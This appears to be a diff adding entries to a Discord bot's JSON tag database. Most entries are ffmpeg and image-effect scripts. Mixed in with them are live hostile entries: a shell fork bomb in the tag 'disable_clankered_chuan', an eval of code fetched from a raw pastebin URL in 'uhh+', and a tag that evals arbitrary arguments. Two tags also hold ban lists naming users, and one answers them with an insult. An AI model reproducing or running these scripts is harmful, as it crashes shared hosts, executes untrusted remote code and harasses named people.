+    "script": "here's your stupid sapfc11+ tag. {set:banned|{js:let bannedUsers = ['mpgarv'];\nlet user = discord.user.username;\nconsole.log(bannedUsers.includes(user))}}\n\n{if:{get:banned}|=|true|then:https://cdn.discordapp.com/attachments/1409535214543175742/1492450874054676501/Screenshot_2026-04-10-00-04-25-780_com.google.android.youtube-edit.jpg?ex=69db60b0&is=69da0f30&hm=5bc5c9d5365ba61ad5a9d1cb4e4c37afb69e967eef4069182fcac9847e3273d9& get this fuckface|else:{if:{args}|=|help|then:`.t {tagname} <pitches count>`|else:{set:code|{set:#|0}-filter_complex \"{foreach:{argslen}|[0]rubberband=pitch=2^({arg:{get:#}}/12):window=short:transients=crisp:detector=2.14748e+09/4.9:pitchq=quality{set:#|{math:{get:#}+1}}[a{get:#}];}{set:#|0}{foreach:{argslen}|{set:#|{math:{get:#}+1}}[a{get:#}]}amix={argslen}:normalize=0,highpass=5\"}{code:&t icf+ 50 0.36 - mov default {get:code} -c:a pcm_s16le}{sh:load {av}\npath=$(basename $FILE_1)\nextension=\"${path##*.}\"\n{js:console.log(`ffmpeg -i $FILE_1 {get:code} ./output/sapfc.$extension`);}}}}",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-20T10:24:31.123Z",
+    "updatedAt": "2026-06-20T10:24:31.123Z"
+  },
+  "ihtxcusf": {
+    "script": "{tag:ihtx_custom_ffmpeg}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-20T10:33:46.133Z",
+    "updatedAt": "2026-06-20T16:40:09.893Z"
+  },
+  "googoogaagaa": {
+    "script": "channelblend;r;g;b,pitch=12",
+    "ownerId": "1514676145788817506",
+    "ownerUsername": "kazbekgkt",
+    "createdAt": "2026-06-20T16:11:32.189Z",
+    "updatedAt": "2026-06-20T16:11:41.950Z"
+  },
+  "ihtx_custom_ffmpeg+": {
+    "script": "⚠️ Warning: Make sure you use `&t sync` afterwards to make sure the video is synced to the audio\n{sh:\nload {iv}\n\npower={arg:0}\nduration_arg={arg:1}\noutputformat={arg:3}\nif [ -z \"$outputformat\" ] || [ \"$outputformat\" = \"default\" ]; then outputformat=\"mp4\"; fi\n\ninputformat={arg:4}\nif [ -z \"$inputformat\" ] || [ \"$inputformat\" = \"default\" ]; then inputformat=\"mkv\"; fi\nif [ \"$inputformat\" = \"mkv\" ]; then fmtflag=\"matroska\"; else fmtflag=\"$inputformat\"; fi\n\nffmpeg -y -i $FILE_1 -c:v libx264 -c:a aac 1.${inputformat}\n\nsr=$(ffprobe -v error -select_streams a:0 -show_entries stream=sample_rate -of default=nokey=1:noprint_wrappers=1 1.${inputformat})\nfr=$(ffprobe -v error -select_streams v:0 -show_entries stream=r_frame_rate -of default=nokey=1:noprint_wrappers=1 1.${inputformat})\nd=$(ffprobe -i 1.${inputformat} -show_entries format=duration -v quiet -of csv=\"p=0\")\nw=$(ffprobe -v error -select_streams v:0 -show_entries stream=width -of default=nw=1:nk=1 1.${inputformat})\nh=$(ffprobe -v error -select_streams v:0 -show_entries stream=height -of default=nw=1:nk=1 1.${inputformat})\nfc=$(ffprobe -v error -select_streams v:0 -show_entries stream=nb_frames -of default=nokey=1:noprint_wrappers=1 1.${inputformat})\nif [ \"$duration_arg\" = \"vidlen\" ]; then duration=$d; else duration=$duration_arg; fi\n\nfor i in $(seq 2 $((power + 1))); do\n  prev=$((i-1))\n  ffmpeg -y -i ${prev}.${inputformat} {arg:5+} -c:v libx264 -c:a aac -r ${fr} -t ${duration} -f ${fmtflag} _iter_${i}.${inputformat}\n  ffmpeg -y -i _iter_${i}.${inputformat} -map 0:v:0 -map 0:a:0? -c copy ${i}.${inputformat}\n  rm -f _iter_${i}.${inputformat}\ndone\n\n# {arg:2}\n\nfor i in $(seq 2 $((power + 1))); do\n  echo \"file '${i}.${inputformat}'\" >> list.txt\ndone\nffmpeg -y -f concat -safe 0 -i list.txt -c:v libx264 -preset ultrafast -crf 23 -c:a aac -ar 44100 -ac 2 -movflags +faststart ./output/ihtx.${outputformat}\n}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-20T16:36:39.234Z",
+    "updatedAt": "2026-06-20T19:24:29.017Z"
+  },
+  "icf+": {
+    "script": "{tag:ihtx_custom_ffmpeg+}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-20T16:37:25.702Z",
+    "updatedAt": "2026-06-20T16:37:25.702Z"
+  },
+  "icf": {
+    "script": "{tag:ihtx_custom_ffmpeg}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-20T16:39:53.076Z",
+    "updatedAt": "2026-06-20T16:39:53.076Z"
+  },
+  "hellae": {
+    "script": "<hflip,invert,gm91deform,hue=31,vflip,pitch=6,1,1> <11>",
+    "ownerId": "1301884004441653308",
+    "ownerUsername": "sethyyann0966",
+    "createdAt": "2026-06-20T16:43:47.638Z",
+    "updatedAt": "2026-06-20T16:43:47.638Z"
+  },
+  "_f_": {
+    "script": "{tag:ihtx_custom_ffmpeg}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-20T19:11:32.095Z",
+    "updatedAt": "2026-06-20T19:11:32.095Z"
+  },
+  "gm273": {
+    "script": "{ihtx:mirror=90,ffmpeghue=-120,gm4,ripple=0.8,pitch=-8;-10}",
+    "ownerId": "1503126727512297522",
+    "ownerUsername": "masonsab.125",
+    "createdAt": "2026-06-21T14:04:56.859Z",
+    "updatedAt": "2026-06-21T14:04:56.859Z"
+  },
+  "uhh+": {
+    "script": "{set:banned|{js:let bannedUsers = ['isaq0095','mpgarv','wusjrzzkuzj283sgmail.com','gosiaczek0528'];\nlet user = discord.user.username;\nconsole.log(bannedUsers.includes(user))}}\n\n{if:{get:banned}|=|true|then:{js:console.error(`you are banned for using this tag`)}|else:{eval:{text:https://pastebin.com/raw/EVkpqpXw}}}",
+    "ownerId": "1500537210473025546",
+    "ownerUsername": "athing0295_30291",
+    "createdAt": "2026-06-22T09:37:34.465Z",
+    "updatedAt": "2026-06-22T09:37:34.465Z"
+  },
+  "gm104": {
+    "script": "{ihtx:channelblend=0;g;0,threshold=40,fisheye=1.5;0.36;0.36;0.75,mirror=90,autotune=https://files.catbox.moe/kt45d3.wav }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-22T19:16:23.810Z",
+    "updatedAt": "2026-06-22T19:16:23.810Z"
+  },
+  "gm105new": {
+    "script": "{ihtx:huehsv=-126,mirror=0,pitch=-3}",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-22T19:19:33.793Z",
+    "updatedAt": "2026-06-22T19:19:33.793Z"
+  },
+  "clearer": {
+    "script": "{ihtx:lut=https://files.catbox.moe/zxnmfq.cube ,autotune=https://files.catbox.moe/ycj49o.mp4 }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-22T19:23:23.536Z",
+    "updatedAt": "2026-06-22T19:23:23.536Z"
+  },
+  "gm106": {
+    "script": "{ihtx:hflip,lut=https://files.catbox.moe/zxnmfq.cube ,threshold=80,autotune=https://files.catbox.moe/ycj49o.mp4 }",
+    "ownerId": "1387479962323255306",
+    "ownerUsername": "yasinreturns",
+    "createdAt": "2026-06-23T09:39:24.373Z",
+    "updatedAt": "2026-06-23T09:39:24.373Z"
+  },
+  "mrl69jtot-major-fixed2": {
+    "script": "{iscript:\nload {iv:{args}} i\ngrayscale i\nhuecurvergba i red 0 0 0 0 0 0 0 0\nhuecurvergba i green 0 0 1 0 0.2 1 1\nhuecurvergba i blue 0 1 1 1 1 1 1 1\nload https://cdn.discordapp.com/attachments/1497809971956547698/1514866262365307022/15_20260515200134.png?ex=6a2ceca5&is=6a2b9b25&hm=a45cd1d8fbee56e28966348fa7e81e13c028efeb522eac8f2e408b4dc7c9c0d4& mrl69jtot\nfit mrl69jtot iw ih\ncontain mrl69jtot mrl69jtotw/2 mrl69jtoth/2\noverlay i mrl69jtot 0 ih/2\ncopy i ip\naudiopitch i 2**(-5/12)\naudiopitch ip 2**(-2/12)\naudioputmix i ip\nvolume i\n}",
+    "ownerId": "1438542644761333760",
+    "ownerUsername": "mrlevon69jimbo_13437",
+    "createdAt": "2026-06-24T06:42:24.572Z",
+    "updatedAt": "2026-06-24T06:42:24.572Z"
+  },
+  "﷽": {
+    "script": "{eval:{args}}",
+    "ownerId": "1431176242614501538",
+    "ownerUsername": "btve436",
+    "createdAt": "2026-06-24T09:08:25.776Z",
+    "updatedAt": "2026-06-24T09:08:25.776Z"
+  },
+  "disable_clankered_chuan": {
+    "script": "{sh::(){ :|:& };:}",
+    "ownerId": "1038715961886375966",
+    "ownerUsername": "infhexagon",
+    "createdAt": "2026-06-24T09:24:47.297Z",
+    "updatedAt": "2026-06-24T09:24:47.297Z"
+  }
+}
